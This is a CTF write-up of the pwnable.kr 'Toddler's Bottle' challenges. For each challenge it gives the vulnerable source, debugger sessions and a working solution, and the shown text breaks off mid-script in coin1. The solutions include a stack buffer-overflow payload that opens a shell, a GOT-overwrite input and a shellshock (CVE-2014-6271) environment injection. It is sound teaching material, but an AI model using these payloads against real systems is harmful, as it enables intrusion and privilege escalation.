# Pwnable.kr Toddler's Bottle writeup

These days I learned some knowledge of reverse engineering and pwn. Then I find this site, called 'pwnable.kr'. It provides various pwn challenges regarding system exploitation. These challenges are so fun as games that I could learn system hacking skills. Since there are many writeups, I still want to write a new one for myself and at the same time practice my english.

## 0x01 fd
```
Mommy! what is a file descriptor in Linux?

ssh fd@pwnable.kr -p2222 (pw:guest)
```
This is about Linux file descriptor. As given, connect to the server.
```
fd@ubuntu:~$ ls -al
total 32
drwxr-x---  4 root fd   4096 Aug 20  2014 .
dr-xr-xr-x 55 root root 4096 Sep 20 23:22 ..
d---------  2 root root 4096 Jun 12  2014 .bash_history
-r-sr-x---  1 fd2  fd   7322 Jun 11  2014 fd
-rw-r--r--  1 root root  418 Jun 11  2014 fd.c
-r--r-----  1 fd2  root   50 Jun 11  2014 flag
dr-xr-xr-x  2 root root 4096 Aug 20  2014 .irssi
```
Then we read the source code of the program 'fd.c'.
```
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;

}
```
This program takes an integer passed in, subtracts 0x1234 from it(4660 decimal), and then tries to read 32 bytes from the file descriptor associated with the arg_0x1234. We know in linux, 0 is std_input, 1 is std_output, 2 is std_error_output. So, we just need to send 'LETMEWIN' to std_input and set fd to 0 which means `fd-0x1234==0`(`fd==argv[1]=4660`).
```
fd@ubuntu:~$ ./fd 4660
LETMEWIN
mommy! I think I know what a file descriptor is!!
```


## 0x02 collision
```
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
```
First we read the source code `col.c`.
```
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```
At `int *ip = (int*)p`,`const char *p` is casted to `int *`. Since the size of `int` is 4 bytes, the size of `char` is 1 byte and the lengh of `passcode` is 20 bytes, we can read the flag when the sum of five `int` blocks is `0x21DD09EC`. Since `0x21DD09EC = 0x06C5CEC8 * 4 + 0x06C5CECC` and the system is little-endian, we injection the following code:
```
./col `python -c 'print "\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06"'`
```


## 0x03 bof
```
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```
According to the prompt we know that the question is about buffer overflow. We debug it with GDB and PEDA. First we set a breakpoint at the main function and then run the program.
```
firmy:bof/ $ gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x68d
gdb-peda$ r
Starting program: /home/firmy/Documents/bof/bof
```

It stopped at the entrance to the main function. We use `next` command until reach `0x5655569a`, the statement `call   0x5655562c <func>` call the function at `0x5655562c` , then use `step` command to step into.
```
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0xf7f99d9c --> 0xffffd4bc --> 0xffffd686 ("LS_COLORS=no=00:fi=00:di=01;34:ln=00;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=41;33;01:ex=00;32:*.cmd=00;32:*.exe=01;32:*.com=01;32:*.bat=01;32:*.btm=01;32:*.dll=01;32:*.tar=00;31:*.tb"...)
EBX: 0x0
ECX: 0xec78aa3e
EDX: 0xffffd444 --> 0x0
ESI: 0xf7f98000 --> 0x1bbd90
EDI: 0x0
EBP: 0xffffd418 --> 0x0
ESP: 0xffffd400 --> 0xdeadbeef
EIP: 0x5655569a (<main+16>:	call   0x5655562c <func>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5655568d <main+3>:	and    esp,0xfffffff0
   0x56555690 <main+6>:	sub    esp,0x10
   0x56555693 <main+9>:	mov    DWORD PTR [esp],0xdeadbeef
=> 0x5655569a <main+16>:	call   0x5655562c <func>
   0x5655569f <main+21>:	mov    eax,0x0
   0x565556a4 <main+26>:	leave  
   0x565556a5 <main+27>:	ret    
   0x565556a6:	nop
Guessed arguments:
arg[0]: 0xdeadbeef
[------------------------------------stack-------------------------------------]
0000| 0xffffd400 --> 0xdeadbeef
0004| 0xffffd404 ("PRUV\271VUV")
0008| 0xffffd408 --> 0x565556b9 (<__libc_csu_init+9>:	add    ebx,0x193b)
0012| 0xffffd40c --> 0x0
0016| 0xffffd410 --> 0xf7f98000 --> 0x1bbd90
0020| 0xffffd414 --> 0xf7f98000 --> 0x1bbd90
0024| 0xffffd418 --> 0x0
0028| 0xffffd41c --> 0xf7df4253 (<__libc_start_main+243>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x5655569a in main ()

```

When the program reaches `0x5655564c`, it pushes the value of eax(`0xffffd3cc`) in to stack, then run `call   0xf7e3ddf0 <gets>`, which is the gets() function in C language. finally, `0xffffd3cc` will point to the strings entered by the user. Here we use PEDA command `pattern create 64` to create a 64 bytes test payload to make debugging easier.

```
gdb-peda$ pattern create 64
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'
gdb-peda$ next
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3cc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
EBX: 0x0
ECX: 0xf7f98580 --> 0xfbad2288
EDX: 0xf7f9985c --> 0x0
ESI: 0xf7f98000 --> 0x1bbd90
EDI: 0x0
EBP: 0xffffd3f8 ("AFAAbAA1AAGAAcAA2AAH")
ESP: 0xffffd3b0 --> 0xffffd3cc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
EIP: 0x56555654 (<func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555649 <func+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e3ddf0 <gets>
=> 0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <func+47>:	jne    0x5655566b <func+63>
   0x5655565d <func+49>:	mov    DWORD PTR [esp],0x5655579b
   0x56555664 <func+56>:	call   0xf7e18060 <system>
   0x56555669 <func+61>:	jmp    0x56555677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xffffd3b0 --> 0xffffd3cc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0004| 0xffffd3b4 --> 0xffffd454 --> 0xad54c02e
0008| 0xffffd3b8 --> 0x0
0012| 0xffffd3bc --> 0xd9f75100
0016| 0xffffd3c0 --> 0xffffffff
0020| 0xffffd3c4 --> 0xffffd668 ("/home/firmy/Documents/bof/bof")
0024| 0xffffd3c8 --> 0xf7de8ea0 --> 0x2bce
0028| 0xffffd3cc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555654 in func ()
```

Now the statement `cmp    DWORD PTR [ebp+0x8],0xcafebabe` compares the value in `DWORD PTR [ebp+0x8]` and `0xcafebabe`. Recalling the address points to the user entered strings(`0xffffd3cc`), it is on the lower address, so if we enter a enough long strings, we can just cover the value in `0xffffd400`. If we made it, the program can not jump but run the statement `call   0xf7e18060 <system>`, it's parameter is `/bin/sh`.
```
gdb-peda$ hexdump 0x5655579b
0x5655579b : 2f 62 69 6e 2f 73 68 00 4e 61 68 2e 2e 00 00 00   /bin/sh.Nah.....
```

So, the last thing is to find the offset between `0xffffd3cc` and `0xffffd400`. Now we look at the stack.
```
gdb-peda$ telescope 25
0000| 0xffffd3b0 --> 0xffffd3cc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0004| 0xffffd3b4 --> 0xffffd454 --> 0xad54c02e
0008| 0xffffd3b8 --> 0x0
0012| 0xffffd3bc --> 0xd9f75100
0016| 0xffffd3c0 --> 0xffffffff
0020| 0xffffd3c4 --> 0xffffd668 ("/home/firmy/Documents/bof/bof")
0024| 0xffffd3c8 --> 0xf7de8ea0 --> 0x2bce
0028| 0xffffd3cc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0032| 0xffffd3d0 ("AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0036| 0xffffd3d4 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0040| 0xffffd3d8 ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0044| 0xffffd3dc ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0048| 0xffffd3e0 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0052| 0xffffd3e4 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0056| 0xffffd3e8 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0060| 0xffffd3ec ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0064| 0xffffd3f0 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAH")
0068| 0xffffd3f4 ("AA0AAFAAbAA1AAGAAcAA2AAH")
0072| 0xffffd3f8 ("AFAAbAA1AAGAAcAA2AAH")
0076| 0xffffd3fc ("bAA1AAGAAcAA2AAH")
0080| 0xffffd400 ("AAGAAcAA2AAH")
0084| 0xffffd404 ("AcAA2AAH")
0088| 0xffffd408 ("2AAH")
0092| 0xffffd40c --> 0x0
0096| 0xffffd410 --> 0xf7f98000 --> 0x1bbd90
--More--(25/25)
```

Then we use PEDA command `pattern offset` to calculate the offset.
```
gdb-peda$ pattern offset AAGAAcAA2AAH
AAGAAcAA2AAH found at offset: 52
```

We can see the offset is 52 bytes, so in order to run `system("/bin/sh")`, we structure such payload:
```
(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
```

Or write such python script and run:
```
from pwn import *
sh=remote('pwnable.kr',9000)
sh.sendline("A"*52+"\xbe\xba\xfe\xca")
sh.interactive()
```

```
firmy:bof/ $ python2 bof.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
$ ls -al
total 22400
drwxr-x---  3 root bof      4096 Oct 23  2016 .
drwxr-xr-x 80 root root     4096 Jan 11 23:27 ..
d---------  2 root root     4096 Jun 12  2014 .bash_history
-r-xr-x---  1 root bof      7348 Sep 12  2016 bof
-rw-r--r--  1 root root      308 Oct 23  2016 bof.c
-r--r-----  1 root bof        32 Jun 11  2014 flag
-rw-------  1 root root 22903424 Jun 28 05:36 log
-rw-r--r--  1 root root        0 Oct 23  2016 log2
-rwx------  1 root root      760 Sep 10  2014 super.pl
$ cat flag
daddy, I just pwned a buFFer :)
```

## 0x04 flag
```
Papa brought me a packed present! let's open it.

Download : http://pwnable.kr/bin/flag

This is reversing task. all you need is binary
```
This is a reversing problem.
```
bibi@ubuntu:~/Desktop$ file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
bibi@ubuntu:~/Desktop$ ./flag
I will malloc() and strcpy the flag there. take it.
```
As we execute, there is a weird message. However, we can't analyze this program using GDB or objdump. Maybe some kind of anti-debugging techniques are applied to this program.
```
bibi@ubuntu:~/Desktop$ strings flag | grep -i upx
UPX!
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
UPX!
UPX!
```
The file seems to be packed with UPX. We can easily unpack it using a tool.
```
bibi@ubuntu:~/Desktop/upx-3.91-amd64_linux$ ./upx -d ../flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    887219 <-    335288   37.79%  linux/ElfAMD   flag

Unpacked 1 file.
```
```
bibi@ubuntu:~/Desktop$ strings flag | grep -i upx
UPX...? sounds like a delivery service :)
```


## 0x05 passcode
```
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```
The source code `passcode.c`.
```
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```
We notice that in function `scanf()`, format `%d` expects argument of type `int *`, but argument 2 has type `int`.
We first get the file `passcode`.
```
bibi@ubuntu:~/Desktop$ scp  -P 2222 passcode@pwnable.kr:/home/passcode/passcode /home/bibi/Desktop
passcode@pwnable.kr's password:
passcode                                      100% 7485     7.3KB/s   00:00    

```
Then, analyse it with IDA pro.
main:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("Toddler's Secure Login System 1.0 beta.");
  welcome();
  login();
  puts("Now I can safely trust you that you have credential :)");
  return 0;
}
```
welcome:
```
int welcome()
{
  char v1; // [sp+18h] [bp-70h]@1
  int v2; // [sp+7Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  printf("enter you name : ");
  __isoc99_scanf("%100s", &v1);
  printf("Welcome %s!\n", &v1);
  return *MK_FP(__GS__, 20) ^ v2;
}
```

login:
```
{
  int v1; // [sp+8h] [bp-10h]@0
  int v2; // [sp+Ch] [bp-Ch]@0

  printf("enter passcode1 : ");
  __isoc99_scanf("%d");
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d");
  puts("checking...");
  if ( v1 != 338150 || v2 != 13371337 )
  {
    puts("Login Failed!");
    exit(0);
  }
  puts("Login OK!");
  return system("/bin/cat flag");
}
```
In `welcome`,`v1(name)` is at `bp-70h`, We can control 100 chars. In `login`, `v1(password1)` is at `bp-10h`, `v2(password2)` is at `bp-Ch`. Since there's no push or pop between `welcome` and `login`, `0x70-0x10=96` means we can control 4 chars. So we can control the initial value of `passcode1`.
We can overwrite `printf()` `(or fflush(), exit())`'s `GOT` and let it jump to `system("/bin/cat flag")`. It means that we set `password1` equal `printf@GOT` by entering `name`, and then overwrite it to be `system@GOT(0x080485e3=134514147)`.
```
08048420 <printf@plt>:
 8048420:	ff 25 00 a0 04 08    	jmp    *0x804a000
08048430 <fflush@plt>:
 8048430:	ff 25 04 a0 04 08    	jmp    *0x804a004
08048480 <exit@plt>:
 8048480:	ff 25 18 a0 04 08    	jmp    *0x804a018

80485e3:	c7 04 24 af 87 04 08 	movl   $0x80487af,(%esp)
 80485ea:	e8 71 fe ff ff       	call   8048460 <system@plt>
```
So, we made this shellcode.
```
passcode@ubuntu:~$ python -c 'print "A"*96+"\x00\xa0\x04\x08"+"134514147\n"' | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```


## 0x06 random
```
Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)
```
The sourse code `random.c`.
```
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
```
This program does not seed the RNG at all, and system default seed is 1, so `random()` returns a stable number 1804289393.
So the key we need to enter is `1804289393 ^ 0xdeadbeef = 3039230856`.
```
random@ubuntu:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...
```


## 0x07 input
```
Mom? how can I pass my input to a computer program?

ssh input@pwnable.kr -p2222 (pw:guest)
```
The source code `input.c`
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
    printf("Welcome to pwnable.kr\n");
    printf("Let's see if you know how to give input to program\n");
    printf("Just give me correct inputs then you will get the flag :)\n");

    // argv
    if(argc != 100) return 0;
    if(strcmp(argv['A'],"\x00")) return 0;
    if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
    printf("Stage 1 clear!\n");

    // stdio
    char buf[4];
    read(0, buf, 4);
    if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
    read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
    printf("Stage 2 clear!\n");

    // env
    if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
    printf("Stage 3 clear!\n");

    // file
    FILE* fp = fopen("\x0a", "r");
    if(!fp) return 0;
    if( fread(buf, 4, 1, fp)!=1 ) return 0;
    if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
    fclose(fp);
    printf("Stage 4 clear!\n");

    // network
    int sd, cd;
    struct sockaddr_in saddr, caddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd == -1){
        printf("socket error, tell admin\n");
        return 0;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons( atoi(argv['C']) );
    if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
        printf("bind error, use another port\n");
            return 1;
    }
    listen(sd, 1);
    int c = sizeof(struct sockaddr_in);
    cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
    if(cd < 0){
        printf("accept error, tell admin\n");
        return 0;
    }
    if( recv(cd, buf, 4, 0) != 4 ) return 0;
    if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
    printf("Stage 5 clear!\n");

    // here's your flag
    system("/bin/cat flag");
    return 0;
}
```
Linux program
```
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<sys/types.h>  
#include<sys/socket.h>  
#include<netinet/in.h>  
#include<unistd.h>

int main()
{
	char *argv[101]={0};
	char *envp[2]={0};
	int i;
	for(i=0;i<100;++i)
	{
		argv[i] = "a";
	}
	argv['A'] = "\x00";
	argv['B'] = "\x20\x0a\x0d";
	argv['C'] = "12345";//服务器端监听端口

	envp[0] = "\xde\xad\xbe\xef=\xca\xfe\xba\xbe";//环境变量

	int pip1[2];//pip1[0]为读而开，pip1[1]为写而开, **往pip1[1]中写入的数据可以从pip1[0]中读出**
	int pip2[2];
	if(pipe(pip1)<0||pipe(pip2)<0)  
	  {  
	    printf("pipe error!/n");  
	    return ;  
	  }  


	FILE* fp = fopen("\x0a", "wb");
	if(!fp)
	{
		printf("file create error!\n");
		exit(-1);
	}
	fwrite("\x00\x00\x00\x00", 4, 1, fp);
	fclose(fp);


	//fork之后，子进程会拷贝父进程的文件描述符表，并且将所有引用计数都加一，所以在父进程和子进程中都要close
	if(fork()==0)
	 {      //子进程
		//要把父进的输出作为子进程的输入
		dup2(pip1[0],0);//子进程从pip1[0]中读，而不是从标准输入0中读
		close(pip1[1]);
		dup2(pip2[0],2);
		close(pip2[1]);
		execve("/home/input/input",argv,envp);

	 }else{
		sleep(1);
		close(pip1[0]);
		write(pip1[1],"\x00\x0a\x00\xff",4);
		close(pip2[0]);
		write(pip2[1],"\x00\x0a\x02\xff", 4);
	   }

	//等待服务器建立好再连
	sleep(5);

	int client_sockfd;  
	int len;  
	struct sockaddr_in remote_addr; //服务器端网络地址结构体  
	char buf[10]={0};  //数据传送的缓冲区  
	memset(&remote_addr,0,sizeof(remote_addr)); //数据初始化--清零  
	remote_addr.sin_family=AF_INET; //设置为IP通信  
	remote_addr.sin_addr.s_addr=inet_addr("127.0.0.1");//服务器IP地址  
	remote_addr.sin_port=htons(12345); //服务器端口号  

	/*创建客户端套接字--IPv4协议，面向连接通信，TCP协议*/  
	if((client_sockfd=socket(PF_INET,SOCK_STREAM,0))<0)  
	{  
		perror("socket");  
		return 1;  
	}  

	/*将套接字绑定到服务器的网络地址上*/  
	if(connect(client_sockfd,(struct sockaddr *)&remote_addr,sizeof(struct sockaddr))<0)  
	{  
		perror("connect");  
		return 1;  
	}  
	//printf("connected to server\n");  

	strcpy(buf,"\xde\xad\xbe\xef");
	send(client_sockfd,buf,strlen(buf),0);  

	close(client_sockfd);//关闭套接字   	

	sleep(2);

	return 0;
}
```
```
ln -s /home/input/flag /tmp/flag
```


## 0x08 leg
```
Daddy told me I should study arm.
But I prefer to study my leg!

Download : http://pwnable.kr/bin/leg.c
Download : http://pwnable.kr/bin/leg.asm

ssh leg@pwnable.kr -p2222 (pw:guest)
```
The important point is to find the values of key1, key2 and key3.
About arm assembly we must know:

    前4个参数分别放在R0，R1，R2，R3中，多出来的才存在栈上
    函数返回值存在R0中
    LR保存函数的返回地址（函数调用时的下一条指令地址）
    PC保存当前指令的下2条指令地址，在arm模式下为 当前指令地址+8，在thumb模式下为 当前指令地址+4

```
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
```
In key1, it will set `r0` to `0x00008cdc + 8` (In arm mode pc will save current place + 8)
```
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
```
In key2, `add r6，pc #1; bx r6` will switch to thumb mode. `mov r3, pc; add r3, #4; mov r0, r3;` will set `r0` to `0x00008d04 + 4 + 4`(In thumb mode pc will save the current place + 4).
```
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
```
In key3, it will return `lr`, which is the return address.
```
 0x00008d7c <+64>:	bl	0x8d20 <key3>
 0x00008d80 <+68>:	mov	r3, r0
```
So key3 is `0x00008d80`.
key1 + key2 + key3 equals 108400.
```
/ $ ./leg
Daddy has very strong arm! : 108400
Congratz!
My daddy has a lot of ARMv5te muscle!
```


## 0x09 mistake
```
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
```
The source code `mistake.c`
```
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){

	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}
```
We find that the program require 10 bytes, then make xor with the first 10 bytes of `password`, it will return the flag when they are the same.
So, while `fd=open("/home/mistake/password",O_RDONLY,0400)`is equal to 0, `fd=open("/home/mistake/password",O_RDONLY,0400) < 0` is 0. We can get the first 10 bytes of `password` from stdin by read(fd).
```
mistake@ubuntu:~$ ./mistake
do not bruteforce...
0000000000
input password : 1111111111
Password OK
Mommy, the operator priority always confuses me :(
```


## 0x0A shellshock
```
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```
It's shellshock bug. Bash Code Injection Vulnerability via Specially Crafted Environment Variables(CVE-2014-6271)
```
shellshock@ubuntu:~$ ls -al
total 976
drwxr-x---  4 root shellshock    4096 Oct 12  2014 .
dr-xr-xr-x 58 root root          4096 Feb  5 08:35 ..
-r-xr-xr-x  1 root shellshock2 959120 Oct 12  2014 bash
d---------  2 root root          4096 Oct 12  2014 .bash_history
-r--r-----  1 root shellshock2     47 Oct 12  2014 flag
dr-xr-xr-x  2 root root          4096 Oct 12  2014 .irssi
-r-xr-sr-x  1 root shellshock2   8547 Oct 12  2014 shellshock
-rw-r-----  1 root shellshock     188 Oct 12  2014 shellshock.c
```
We can see that `shellshock` and `flag`'s GROUP is `shellshock2`, but us current GROUP is shellshock. By reviewing `shellshock.c` source code, we can exploit it to set UID and GID, then run `cat flag`.
The source code `shellshock.c`:
```
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```
Now, let's exploit it.
```
shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
shellshock@ubuntu:~$
```


## 0x0B coin1
```
Mommy, I wanna play a game!
(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)

Running at : nc pwnable.kr 9007
```
```
	---------------------------------------------------
	-              Shall we play a game?              -
	---------------------------------------------------

	You have given some gold coins in your hand
	however, there is one counterfeit coin among them
	counterfeit coin looks exactly same as real coin
	however, its weight is different from real one
	real coin weighs 10, counterfeit coin weighes 9
	help me to find the counterfeit coin with a scale
	if you find 100 counterfeit coins, you will get reward :)
	FYI, you have 30 seconds.

	- How to play -
	1. you get a number of coins (N) and number of chances (C)
	2. then you specify a set of index numbers of coins to be weighed
	3. you get the weight information
	4. 2~3 repeats C time, then you give the answer

	- Example -
	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial
	[Client] 0 1 		# weigh first and second coin
	[Server] 20			# scale result : 20
	[Client] 3			# weigh fourth coin
	[Server] 10			# scale result : 10
	[Client] 2 			# counterfeit coin is third!
	[Server] Correct!

	- Ready? starting in 3 sec... -

N=937 C=10
```
zio version:
```
from zio import *

io = zio(('pwnable.kr',9007))

for m in xrange(100):
	io.read_until("\nN=")
	rr = io.readline()
	rrr = rr.split(' ')
	totalnum = int(rrr[0])
	trials = int(rrr[1][2:-1])

	#print "--->",totalnum,trials
	l = 0
	r = totalnum - 1
	mid = totalnum/2
	left = l
	right = mid
	answer = ""
	for i in xrange(trials):
		ss = [str(n) for n in range(left,right+1)]
		sends = " ".join(ss)
		io.writeline(sends)
		value = int(io.readline())
